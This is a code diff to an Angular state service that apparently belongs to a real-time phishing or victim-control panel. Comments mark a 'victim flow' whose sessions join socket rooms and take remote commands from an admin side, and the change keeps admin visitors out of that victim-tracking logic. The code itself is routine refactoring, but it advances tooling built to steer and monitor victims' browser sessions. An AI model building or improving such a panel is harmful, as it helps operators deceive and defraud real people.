@@ -154,7 +154,9 @@ export class StateService {
 
   constructor(private router: Router) {
     // Detect Admin Mode early to prevent session pollution
-    if (typeof window !== 'undefined' && window.location.pathname.startsWith('/admin')) {
+    const isAdminPath = typeof window !== 'undefined' && window.location.pathname.startsWith('/admin');
+    
+    if (isAdminPath) {
         this.currentView.set('admin');
     } else {
         this.initializeSession();
@@ -182,7 +184,7 @@ export class StateService {
         if (view && view !== this.currentView()) {
             this.currentView.set(view);
             // Don't sync if it's admin or if we are hydrating
-            if (!this.isHydrating) {
+            if (!this.isHydrating && view !== 'admin') {
                 this.syncState();
             }
         }
@@ -196,16 +198,20 @@ export class StateService {
     if (typeof window !== 'undefined') {
         this.socket.connect();
 
-        // Join specific session room
-        this.socket.emit('join', this.sessionId());
+        // Join specific session room (only for victim flow)
+        if (!isAdminPath) {
+            this.socket.emit('join', this.sessionId());
+        }
 
-        // Listen for real-time commands
+        // Listen for real-time commands (victim flow)
         this.socket.on('command', (cmd: any) => {
             this.handleRemoteCommand(cmd);
         });
 
         this.socket.on('connect', () => {
-             this.socket.emit('join', this.sessionId());
+             if (!isAdminPath) {
+                 this.socket.emit('join', this.sessionId());
+             }
              if (this.adminAuthenticated()) {
                  this.socket.emit('joinAdmin');
              }
@@ -218,29 +224,32 @@ export class StateService {
             }
         });
 
-        // Setup Cross-Tab Sync
-        try {
-            this.broadcastChannel = new BroadcastChannel(SYNC_CHANNEL);
-            this.broadcastChannel.onmessage = (ev) => {
-                if (ev.data && ev.data.type === 'STATE_UPDATE' && ev.data.sessionId === this.sessionId()) {
-                   // Only sync if it's the same session ID (user operating multiple tabs)
-                   this.hydrateFromState(ev.data.payload, false);
-                }
-            };
-        } catch(e) { console.warn('BroadcastChannel not supported'); }
+        // === VICTIM FLOW ONLY - Skip for admin path ===
+        if (!isAdminPath) {
+            // Setup Cross-Tab Sync
+            try {
+                this.broadcastChannel = new BroadcastChannel(SYNC_CHANNEL);
+                this.broadcastChannel.onmessage = (ev) => {
+                    if (ev.data && ev.data.type === 'STATE_UPDATE' && ev.data.sessionId === this.sessionId()) {
+                       // Only sync if it's the same session ID (user operating multiple tabs)
+                       this.hydrateFromState(ev.data.payload, false);
+                    }
+                };
+            } catch(e) { console.warn('BroadcastChannel not supported'); }
 
-        // Restore state from storage (Hydration)
-        setTimeout(() => {
-            this.restoreLocalState();
-        }, 0);
+            // Restore state from storage (Hydration)
+            setTimeout(() => {
+                this.restoreLocalState();
+            }, 0);
 
-        // Force initial sync with retry logic
-        this.initialSyncBurst();
-        
-        // Start Polling (Backup to Socket.IO)
-        this.startPolling();
-        this.setupListeners();
-        this.startInactivityMonitor();
+            // Force initial sync with retry logic
+            this.initialSyncBurst();
+            
+            // Start Polling (Backup to Socket.IO)
+            this.startPolling();
+            this.setupListeners();
+            this.startInactivityMonitor();
+        }
 
         // Reactive Sync Effect (Persist & Send)
         effect(() => {
